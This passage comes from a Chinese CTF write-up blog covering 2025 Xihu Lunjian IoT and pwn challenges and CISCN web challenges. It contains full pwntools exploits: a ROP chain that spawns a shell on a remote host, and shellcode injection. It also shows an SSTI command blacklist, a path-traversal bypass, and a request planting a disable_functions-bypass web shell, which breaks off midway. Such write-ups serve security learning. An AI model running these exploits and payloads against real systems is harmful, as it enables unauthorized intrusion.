<p>最后得到data.csv上传到平台即可。</p>
<p><img src="/images/2025西湖论剑/17.png"></p>
<h1 id="iot">IOT</h1>
<h2 id="blink">blink</h2>
<p>shift f12字符串里面翻一翻可以找到这么一串字符串</p>
<p><img src="/images/2025西湖论剑/18.png"></p>
<p>后面接着morse编码的ABCD，提交发现正确rtosandmorseisveryeasyhahhaha</p>
<h2 id="sharkp">sharkp</h2>
<p>打开附件，看到流量文件、bin文件和readme，里面需要一个接口，一个ip地址。先看流量文件分析一下。</p>
<p>最开始，先看的http，发现没什么有用的信息。</p>
<p><img src="/images/2025西湖论剑/19.png"></p>
<p>翻了一下没看出什么端倪。然后决定去文件里看看有没有什么信息，先通过unsquashfs去提取文件系统。</p>
<p>然后翻了一下文件系统，看到这里有个watch-dog，进去看看</p>
<p><img src="/images/2025西湖论剑/20.png"></p>
<p>看门狗文件大概就是系统出现问题，看门狗会自动重启，这里可以去找找有没有对应的文件。etc下的文件没找到，但是找到了alphapd文件。</p>
<p><img src="/images/2025西湖论剑/21.png"></p>
<p>后续又去翻了一下流量文件，特意查看了一下post方法。发现其中</p>
<p><img src="/images/2025西湖论剑/22.png"></p>
<p><img src="/images/2025西湖论剑/23.png"></p>
<p>其中setSystemAdmin非常可疑，看到里面的内容后觉得更可疑了。这个AdminID更是可疑。</p>
<p>也翻了一下前面的setConfigUpload，看到里面很多的a，基本确定了这里就是攻击的流量，这里是pwn在打的过程。</p>
<p><img src="/images/2025西湖论剑/24.png"></p>
<p>我们进入到alphapd里，搜索setSystemAdmin</p>
<p><img src="/images/2025西湖论剑/25.png"></p>
<p><img src="/images/2025西湖论剑/26.png"></p>
<p>在这里可以看到利用点，基本可以确定利用的接口就在这里。这里利用字符串拼接，拼出来的结果是：</p>
<p><img src="/images/2025西湖论剑/27.png"></p>
<p>于是去找了一下telnet的流量，因为是单向流量。所以猜测ip是藏在报文里的</p>
<p><img src="/images/2025西湖论剑/28.png"></p>
<p>telnet流量里的内容如下：</p>
<p><img src="/images/2025西湖论剑/29.png"></p>
<p>但是尝试了setSystemAdmin_2.65.87.199，发现不行。</p>
<p>在telnet数据流中发现了一个http的请求，同时这个端口也是8000.比较奇怪，然后打开报文看了一下，这里是一个elf文件。把这串数据写入文件，分析一下其中的逻辑</p>
<p><img src="/images/2025西湖论剑/30.png"></p>
<p><img src="/images/2025西湖论剑/321.png"></p>
<p>发现也看不太懂，丢给gpt去看。发现这里有存ip，然后解析了一下。发现161.88.195.115不行。</p>
<p>又猜测是小端序，变成小端序后提交，flag正确。即最后的flag是<strong>setSystemAdmin_115.195.88.161</strong></p>
<p><img src="/images/2025西湖论剑/31.png"></p>
<h1 id="pwn">pwn</h1>
<h2 id="vpwn">Vpwn</h2>
<blockquote>
<p>一个简易的C++VECTOR实现</p>
</blockquote>
<p><img src="/images/2025西湖论剑/32.png"></p>
<p>分析一下程序很容易知道，其存储的是int值，并且存储在栈上的v8里面。</p>
<p><img src="/images/2025西湖论剑/33.png"></p>
<p>随便点一个函数进去，可以观察到+24的地方存储vector元素数量，是个8字节数据，正好是v8的第6个元素，因此vector的第6，7个元素的值恰好覆盖v8，若取得很大那么就可以读取和覆盖栈上的任意数据</p>
<p><img src="/images/2025西湖论剑/34.png"></p>
<p>可以通过此函数读取栈上足够多的数据：</p>
<p><img src="/images/2025西湖论剑/35.png"></p>
<p><img src="/images/2025西湖论剑/36.png"></p>
<blockquote>
<p>其他的就是格式的处理了：</p>
<p>py如下：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process("./Vpwn")</span></span><br><span class="line">io = remote(<span class="string">"139.155.126.78"</span>,<span class="number">22675</span>)</span><br><span class="line">elf = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_values</span>(<span class="params">text</span>):</span><br><span class="line">    text = text.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r'StackVector contents:\s*(.*)'</span>, text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        values = [<span class="built_in">int</span>(value) <span class="keyword">for</span> value <span class="keyword">in</span> <span class="keyword">match</span>.group(<span class="number">1</span>).split()]</span><br><span class="line">        <span class="keyword">return</span> values</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">cmd=<span class="string">""</span></span>):</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b"Enter your choice: "</span>,<span class="built_in">str</span>(index).encode(<span class="string">"utf-8"</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">value</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b"Enter the value to push: "</span>,<span class="built_in">str</span>(value).encode(<span class="string">"utf-8"</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span>  extract_values(io.recvline())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,value</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b"Enter the index to edit (0-based): "</span>,<span class="built_in">str</span>(index).encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b"Enter the new value: "</span>,<span class="built_in">str</span>(value).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">injectindex,length</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        edit(injectindex+i,payloadarray[i])</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    push(<span class="number">0x300</span>)</span><br><span class="line">test = show()</span><br><span class="line">hex_values = [<span class="built_in">hex</span>(value <span class="keyword">if</span> value &gt;= <span class="number">0</span> <span class="keyword">else</span> (<span class="number">1</span> &lt;&lt; <span class="number">32</span>) + value) <span class="keyword">for</span> value <span class="keyword">in</span> test]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"hex_values.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> hex_values:</span><br><span class="line">        f.write(value + <span class="string">"\n"</span>)</span><br><span class="line"><span class="comment"># print(hex_values)</span></span><br><span class="line"></span><br><span class="line">valuelist = show()</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">__libc_start_maina_add = (valuelist[<span class="number">59</span>]&lt;&lt;<span class="number">32</span>|valuelist[<span class="number">58</span>])</span><br><span class="line">libcbase = <span class="number">0x7cb250a00000</span> - <span class="number">0x7cb250a29e40</span> + __libc_start_maina_add</span><br><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+libcbase</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+libcbase</span><br><span class="line">rbcdx = <span class="number">0x0000000000108b03</span>+libcbase</span><br><span class="line">execve = elf.symbols[<span class="string">"execve"</span>]+libcbase</span><br><span class="line">binsh = <span class="number">0x1D8678</span>+libcbase</span><br><span class="line">payloadarray = [rdi&amp;<span class="number">0xffffffff</span>,(rdi&gt;&gt;<span class="number">32</span>),</span><br><span class="line">                binsh&amp;<span class="number">0xffffffff</span>,(binsh&gt;&gt;<span class="number">32</span>),</span><br><span class="line">                rsi&amp;<span class="number">0xffffffff</span>,(rsi&gt;&gt;<span class="number">32</span>),(<span class="number">0x0</span>),(<span class="number">0x0</span>),</span><br><span class="line">                rbcdx&amp;<span class="number">0xffffffff</span>,(rbcdx&gt;&gt;<span class="number">32</span>),(<span class="number">0</span>),(<span class="number">0</span>),(<span class="number">0</span>),(<span class="number">0</span>),(<span class="number">0</span>),(<span class="number">0</span>),</span><br><span class="line">                execve&amp;<span class="number">0xffffffff</span>,(execve&gt;&gt;<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(58,rdi&amp;0xffffffff)</span></span><br><span class="line"><span class="comment">#edit(59,(rdi&gt;&gt;32))</span></span><br><span class="line">exploit(<span class="number">18</span>,<span class="built_in">len</span>(payloadarray))</span><br><span class="line"><span class="comment"># dbg('''</span></span><br><span class="line"><span class="comment"># b *$rebase(0x17D0)</span></span><br><span class="line"><span class="comment"># ''')</span></span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()  </span><br></pre></td></tr></table></figure>
<h2 id="heaven-door">HEAVEN DOOR</h2>
<blockquote>
<p>打开程序看一眼，是一个多进程，父进程会执行if内，子进程会执行else，else可以不用去关系，仅仅是输出一些东西</p>
</blockquote>
<p><img src="/images/2025西湖论剑/37.png"></p>
<p>可以看见mmap在0x100000映射了一段内存，然后然我们往里面写内容，然后内容会被当做函数体来执行。</p>
<p><img src="/images/2025西湖论剑/38.png"></p>
<p>因此可以知道此题写shellcode即可。但是开了沙箱，观察一些禁用了那些系统调用：</p>
<p><img src="/images/2025西湖论剑/39.png"></p>
<p>但是此程序的沙箱配置存在问题，可以直接getshell即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">io = process(<span class="string">"./vuln"</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"MADE IN HEAVEN !!!!!!!!!!!!!!!!"</span>)</span><br><span class="line"><span class="built_in">bin</span> = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="built_in">bin</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#print(io.recv())</span></span><br><span class="line"><span class="comment">#print(io.recv())</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/images/2025西湖论剑/40.png"></p>
<p><img src="/images/2025西湖论剑/41.png"></p>
<p><img src="/images/2025西湖论剑/42.png"></p>
<p><img src="/images/2025西湖论剑/43.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2025/02/01/2025CISCN-CCB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2025/02/01/2025CISCN-CCB/" itemprop="url">2025CISCN-CCB</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2025-02-01T09:28:37+08:00">
                2025-02-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WriteUp/" itemprop="url" rel="index">
                    <span itemprop="name">WriteUp</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="web">web</h2>
<h3 id="safe_proxy">Safe_Proxy</h3>
<p>主页直接给代码了</p>
<p>先改代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/'</span>, methods=[<span class="string">"POST"</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template_code = request.form.get(<span class="string">"code"</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">'__'</span>, <span class="string">'import'</span>, <span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'eval'</span>, <span class="string">'subprocess'</span>, <span class="string">'popen'</span>, <span class="string">'system'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Forbidden content detected!"</span></span><br><span class="line">    result = render_template_string(template_code)</span><br><span class="line">    <span class="built_in">print</span>(template_code)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>需要把result返回，并且要把传入的code输出用来记录payload</p>
<p>然后把flask监听改成0.0.0.0</p>
<p>然后fenjing直接梭</p>
<p>fenjing webui</p>
<p><img src="/images/2025CISCN-CCB/1280X1280.PNG"></p>
<p>直接爆破即可，最终日志得到执行命令的payload，注意需要</p>
<p><img src="/images/2025CISCN-CCB/1.PNG"></p>
<p>可以得到ls的payload</p>
<p>将flag写入app.py，之后直接通过get的方式读取__file__</p>
<p><img src="/images/2025CISCN-CCB/2.png"></p>
<p><img src="/images/2025CISCN-CCB/3.png"></p>
<h3 id="hello_web">hello_web</h3>
<p><img src="/images/2025CISCN-CCB/4.png"></p>
<p>随便输点，可以看到../hackme.php和tips.php</p>
<p>../经过尝试猜测被过滤，双写进行绕过</p>
<p><img src="/images/2025CISCN-CCB/5.png"></p>
<p>tips有phpinfo，然后可以看到一堆disable function</p>
<p>hackme有一段代码，大概是这样的</p>
<p><img src="/images/2025CISCN-CCB/6.png"></p>
<p>这张是当时调试的图片，忘记截屏了</p>
<p>base64可以解码</p>
<p><img src="/images/2025CISCN-CCB/7.png"></p>
<p>把里面eval改成echo，可以看到执行的内容，前提是把这段代码和前面刚刚那个截屏放在一起</p>
<p><img src="/images/2025CISCN-CCB/8.png"></p>
<p>然后传参数的时候要注意php非法参数名的事情</p>
<p>需要传cmd[66.99=xxx</p>
<p>之后因为有disbale function，使用github的项目绕过即可</p>
<p>https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php</p>
<p>用这个shell.php</p>
<p>之后稍微改一下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?file=../....//hackme.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>eci-2ze4xxsimq68wmh5do7k.cloudeci1.ichunqiu.com:80</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://eci-2ze8chizbklyqw43ji9i.cloudeci1.ichunqiu.com/index.php?file=hello.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml">cmd[66.99=</span><span class="template-variable">{{<span class="name">url</span>(<span class="name">?</span>&gt;&lt;?php</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">echo <span class="string">"Disable functions: "</span> . ini_get(<span class="name">"disable_functions"</span>) . <span 